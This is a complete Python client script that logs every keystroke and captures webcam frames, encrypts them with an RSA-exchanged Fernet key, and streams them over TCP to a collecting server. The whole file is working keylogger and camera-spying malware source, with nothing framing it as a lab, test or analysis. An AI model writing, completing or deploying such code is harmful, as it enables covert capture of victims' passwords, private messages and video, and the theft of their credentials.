#!/usr/bin/env python3
import socket
import threading
import struct
import time
import sys

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet
from pynput import keyboard
import cv2

# --- Packet type bytes ---
TYPE_TEXT = b"\x01"
TYPE_VIDEO = b"\x02"


# --- Helper utilities ---
def recvall(sock, n):
    data = bytearray()
    while len(data) < n:
        part = sock.recv(n - len(data))
        if not part:
            raise ConnectionError("Socket closed while reading")
        data.extend(part)
    return bytes(data)


def send_packet(
    sock: socket.socket,
    send_lock: threading.Lock,
    pkt_type: bytes,
    payload_plain: bytes,
    fernet: Fernet,
):
    enc = fernet.encrypt(payload_plain)
    with send_lock:
        sock.sendall(pkt_type)
        sock.sendall(struct.pack(">I", len(enc)))
        sock.sendall(enc)


# --- Keystroke capture ---
class KeySender:
    def __init__(self, sock, fernet, send_lock, interval=5):
        self.sock = sock
        self.fernet = fernet
        self.send_lock = send_lock
        self.buffer = []
        self.lock = threading.Lock()
        self.interval = interval  # seconds

    def on_press(self, key):
        with self.lock:
            try:
                if hasattr(key, "char") and key.char is not None:
                    self.buffer.append(key.char)
                else:
                    self.buffer.append(f"[{str(key)}]")
            except Exception:
                self.buffer.append(f"[{repr(key)}]")

    def send_loop(self):
        """
        Every `interval` seconds, take whatever is in buffer,
        join it as-is (special keys included), encrypt, send to server, then clear buffer.
        """
        while True:
            time.sleep(self.interval)
            with self.lock:
                if self.buffer:
                    msg = "".join(self.buffer)
                    self.buffer.clear()
                else:
                    msg = ""

            if msg:
                try:
                    send_packet(
                        self.sock,
                        self.send_lock,
                        TYPE_TEXT,
                        msg.encode("utf-8"),
                        self.fernet,
                    )
                except Exception as e:
                    print("[!] Failed to send keystrokes:", e)
                    break

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        t = threading.Thread(target=self.send_loop, daemon=True)
        t.start()


# --- Video sender ---
def video_sender_loop(sock, send_lock, fernet, camera_index=0, fps=8, quality=70):
    cap = cv2.VideoCapture(camera_index)
    if not cap.isOpened():
        print(f"[!] Camera at index {camera_index} not available")
        return

    print(f"[*] Video capture started (camera index: {camera_index})")
    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                print("[!] Failed to read frame from camera")
                break

            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
            ok, buf = cv2.imencode(".jpg", frame, encode_param)
            if not ok:
                continue
            jpg_bytes = buf.tobytes()
            try:
                send_packet(sock, send_lock, TYPE_VIDEO, jpg_bytes, fernet)
            except Exception as e:
                print("[!] Failed to send video frame:", e)
                break

            time.sleep(1.0 / fps)
    except Exception as e:
        print("[!] video_sender_loop exception:", e)
    finally:
        cap.release()
        print("[*] Video sender stopped")


# --- Main connection + handshake ---
def main():
    HOST = "127.0.0.1"  # server IP
    PORT = 5000  # server port

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))

    # receive server public key
    size_bytes = recvall(sock, 4)
    size = struct.unpack(">I", size_bytes)[0]
    pub_pem = recvall(sock, size)
    rsa_pub = serialization.load_pem_public_key(pub_pem)

    # generate fernet key and send encrypted
    session_key = Fernet.generate_key()
    fernet = Fernet(session_key)
    enc_key = rsa_pub.encrypt(
        session_key,
        padding.OAEP(
            mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None
        ),
    )
    sock.sendall(struct.pack(">I", len(enc_key)))
    sock.sendall(enc_key)
    print("[*] Sent encrypted session key.")

    send_lock = threading.Lock()

    # start keystroke sender
    k = KeySender(sock, fernet, send_lock)
    k.start()

    # start video sender
    video_thread = threading.Thread(
        target=video_sender_loop, args=(sock, send_lock, fernet), daemon=True
    )
    video_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Client exiting.")
    finally:
        try:
            sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
